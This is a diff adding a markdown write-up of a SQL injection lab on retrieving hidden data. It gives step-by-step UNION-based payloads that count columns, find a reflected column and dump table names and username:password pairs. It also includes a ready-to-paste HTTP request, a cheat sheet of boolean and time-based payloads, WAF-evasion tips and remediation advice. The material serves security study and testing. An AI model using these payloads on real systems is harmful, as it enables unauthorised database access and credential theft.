@@ -257,3 +257,167 @@ Always adapt to DB comment style and context (string vs numeric).
 - Remediation summary: parameterized queries + hardening.
 
 ---
+
+# SQL Injection Lab-3 — Retrieving Hidden Data 
+
+---
+
+## 🔹 One-line summary
+SQL injection lets attacker-controlled input alter a query (WHERE/UNION) so it returns rows it normally wouldn’t — e.g., unreleased products, user data, or internal information.
+
+---
+
+## 🔹 What is this topic? (short)
+SQL injection (SQLi) occurs when untrusted input is concatenated into SQL. In the “retrieving hidden data” lab we neutralize filters (e.g., AND released = 1) or use UNION SELECT to extract hidden rows from the database.
+
+---
+
+## 🔹 Why this matters (real-world risk)
+- *Data disclosure:* sensitive rows (users, configs, secrets) can be read.  
+- *Business impact:* leak of unreleased products or internal data.  
+- *Pivoting:* DB contents often reveal creds, hostnames or queries to internal services → further compromise.
+
+---
+
+## 🔹 High-value injection targets
+- Filter/search params: /filter?category=..., /search?q=...  
+- ID/item params: /product?id=..., /item?id=...  
+- Sort/pagination: order, limit, page  
+- JSON body fields in APIs: {"category":"..."}  
+- Export endpoints: /export?table=...
+
+---
+
+## 🔹 Quick concept checklist
+- Test a single-quote ' for errors.  
+- Boolean tests: OR 1=1 vs OR 1=2.  
+- Use comments to truncate remainder (--, #, /* */).  
+- Count columns with UNION SELECT NULL,....  
+- Use UNION SELECT 'MKR1','MKR2',... to find a reflected column.  
+- If no direct output: use blind (time) or OOB (DNS/HTTP) techniques.
+
+---
+
+## 🔹 Lab walkthrough — exact steps 
+
+1. *Capture baseline request*  
+   - Proxy *ON* → click the category/filter in the app. Copy the captured GET /filter?category=... to *Repeater*.
+
+2. *Sanity test*  
+   - Edit parameter: add a single-quote (e.g. category=Gifts') and *Send*. Look for DB errors or page changes.
+
+3. *Count columns (UNION-NULL method)*  
+   - Try:
+     
+     GET /filter?category=Gifts' UNION SELECT NULL-- 
+     
+     If an error occurs, increase NULL count:
+     
+     GET /filter?category=Gifts' UNION SELECT NULL,NULL-- 
+     GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- 
+     
+     Continue until the server returns an altered/normal response — that NULL count = number of columns.
+
+4. *Find a reflected column*  
+   - With the correct column count inject markers:
+     
+     GET /filter?category=Gifts' UNION SELECT 'MKR1','MKR2','MKR3'-- 
+     
+     (adjust number of MKR values to match column count). *Send* and inspect the raw response / page source for MKR1/MKR2/MKR3 — the one you see is the reflected column.
+
+5. *Extract data using the reflected column*  
+   - Replace the marker in the reflected column with useful functions:
+     
+     GET /filter?category=Gifts' UNION SELECT NULL,version(),NULL--        (if column2 reflected)
+     GET /filter?category=Gifts' UNION SELECT NULL,group_concat(table_name SEPARATOR 0x3a),NULL FROM information_schema.tables WHERE table_schema=database()--
+     GET /filter?category=Gifts' UNION SELECT NULL,group_concat(concat(username,0x3a,password) SEPARATOR 0x0a),NULL FROM users--
+     
+     Adjust queries to the DB (MySQL examples above). *Send* and capture the response showing extracted rows.
+
+6. *Save PoC*  
+   - Save the exact raw request(s) and response(s). Take a screenshot of Repeater showing the payload and the page/body with extracted data.
+
+---
+
+## 🧾 Proof / Evidence
+
+1. *Screenshot — PoC request/response (columns matched)*  
+  ![Injected SQL Injection in product category](../images/sqli-filter-hidden.png)
+   Description: Repeater request showing the injected UNION SELECT NULL,... payload and the response containing unreleased/hidden data (used to confirm correct column count and the reflected column).
+
+---
+
+## 🔹 PoC / Repeater-ready example (copy/paste & edit)
+
+http
+GET /filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- HTTP/1.1
+Host: <LAB_HOST>
+User-Agent: Mozilla/5.0
+Accept: /
+Connection: close
+
+When columns = 3 and column 2 is reflected:
+
+GET /filter?category=Gifts' UNION SELECT NULL,group_concat(concat(username,0x3a,password) SEPARATOR 0x0a),NULL FROM users-- HTTP/1.1
+Host: <LAB_HOST>
+...
+
+> URL-encode payloads when pasting into a browser (e.g. ' → %27, spaces → %20, -- → %2D%2D) if needed
+
+---
+
+## 🔹 Common payloads & quick cheats
+
+- *Comment out rest:*  
+  `' + --` or `' + OR + 1=1 --`
+
+- *Force true:*  
+  `' OR '1'='1'--`
+
+- *Numeric id injection:*  
+  `1' OR 1=1--`
+
+- *Time-based (MySQL):*  
+  `' OR SLEEP(5)--`
+
+- *Count columns:*  
+  `UNION SELECT NULL, NULL, ... --`
+
+- *Marker test (find reflected column):*  
+  `UNION SELECT 'MKR1','MKR2',... --`
+
+> *Note:* Always adapt comment style and payload syntax to the target DB and context (--, #, /* ... */).
+
+---
+
+## 🔹 Troubleshooting
+
+- *500 / syntax errors when NULL count is wrong* → increase/decrease NULL count until the server stops returning a syntax error.  
+- *No visible marker* → check raw HTML, element attributes, inline scripts, and comments (the marker may be reflected in non-visible locations).  
+- *Type mismatch errors* → use NULL for non-reflected columns or CAST(... AS CHAR) for type conversion.  
+- *WAF blocking UNION* → try simple obfuscation (e.g., UN/**/ION) or use ORDER BY column-counting to discover number of columns.  
+- *Large results truncated* → extract in smaller chunks using LIMIT/OFFSET or SUBSTRING().
+
+---
+
+## 🔹 Fixes / remediation (what to report)
+
+- Use *parameterized queries / prepared statements* (never concatenate user input into SQL).  
+- Enforce strict *whitelists* for expected values (categories, IDs).  
+- Remove verbose DB errors from public responses; log them internally.  
+- Apply *least-privilege* principles to DB accounts (no FILE/xp_cmdshell for web app user).  
+- Output-encode DB-derived content and monitor for suspicious query patterns.
+
+---
+
+## 🔹 Pentest checklist (copyable)
+
+1. Capture request → baseline.  
+2. Test a single-quote ' → see if errors appear.  
+3. Count columns using UNION SELECT NULL,....  
+4. Find reflected column with UNION SELECT 'MKR1',....  
+5. Extract data via group_concat / concat (or equivalent).  
+6. Save raw PoC request + response and take screenshots.  
+7. Recommend parameterized queries and whitelisting in the report.
+
+---
